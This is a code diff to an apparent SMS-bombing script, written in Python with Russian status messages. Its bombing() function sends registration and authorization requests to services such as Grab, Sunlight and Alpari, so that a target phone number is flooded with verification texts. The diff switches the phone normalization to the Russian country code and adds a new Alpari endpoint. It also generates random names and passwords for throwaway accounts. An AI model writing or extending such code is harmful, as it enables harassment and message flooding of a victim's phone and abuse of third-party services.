@@ -72,20 +72,19 @@ def bombing():
     global name
     global iteration
     if phone[0] == '+':
-        phone = phone[3:]
+        phone = phone[1:]
     if phone[0] == '8':
-        phone = '375' + phone[3:]
+        phone = '7' + phone[1:]
     if phone[0] == '9':
-        phone = '375' + phone
+        phone = '7' + phone
     for x in range(12):
         name = name + random.choice(list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
         password = name + random.choice(list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
         username = name + random.choice(list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
 
-    phone9 = phone[3:]
+    phone9 = phone[1:]
     email = name+f'{iteration}'+'@gmail.com'
     email = name+f'{iteration}'+'@gmail.com'
-
     try:
         requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
         print('[+] Grab отправлено!')
@@ -174,6 +173,12 @@ def bombing():
     try:
         requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone})
         print('[+] Sunlight отправлено!')
+    except:
+        print('[-] Не отправлено!')
+
+    try:
+        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': email, 'mobilephone': phone, 'deliveryOption': 'sms'})
+        print('[+] alpari отправлено!')
     except:
         print('[-] Не отправлено!')
 
